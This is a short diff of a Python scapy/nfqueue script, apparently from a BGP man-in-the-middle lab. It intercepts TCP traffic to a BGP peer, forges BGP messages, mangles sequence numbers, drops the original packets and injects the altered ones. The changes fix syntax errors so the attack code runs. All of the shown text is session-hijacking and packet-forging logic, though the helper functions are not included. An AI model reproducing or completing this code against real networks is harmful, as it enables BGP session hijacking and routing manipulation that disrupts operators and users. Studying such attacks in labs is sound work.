@@ -129,7 +129,7 @@ def process(i, payload):
             if destination == '5.6.0.1' and len(str(pkt[TCP].payload))!=0:
                 #if destination is 5.6.0.1 and tcp payload size is not 0
                 forged = False
-                forged, frg pkt = bgp_edit(pkt) #call bgp edit to edit the packet
+                forged, frg_pkt = bgp_edit(pkt) #call bgp edit to edit the packet
                 if forged is True: #If the message was changed
                     message, ack, seq = seq_mangle(seq, ack, '5.6.0.2', '5.6.0.1', frg_pkt, pkt, forged, firstfound)#call mangle seq on forged packet to change sequence number
                 else: #if the message was not forged change only the sequence numbers
@@ -137,7 +137,7 @@ def process(i, payload):
             else: #if the destination was not the sender or if the message is just an ack change only the sequence number
                 message, ack, seq = seq_mangle(seq, ack, '5.6.0.2', '5.6.0.1', pkt, pkt, forged, firstfound)#call mangle seq on original packet to change sequence number
             if firstfound == True: #if session established and forged throw the message
-                payload.set verdict(nfqueue.NF DROP)
+                payload.set_verdict(nfqueue.NF_DROP)
                 #If the message is using the accepted port send its modified version
                 if message[TCP].dport == port or message[TCP].sport == port:
                     send(message, verbose=0)
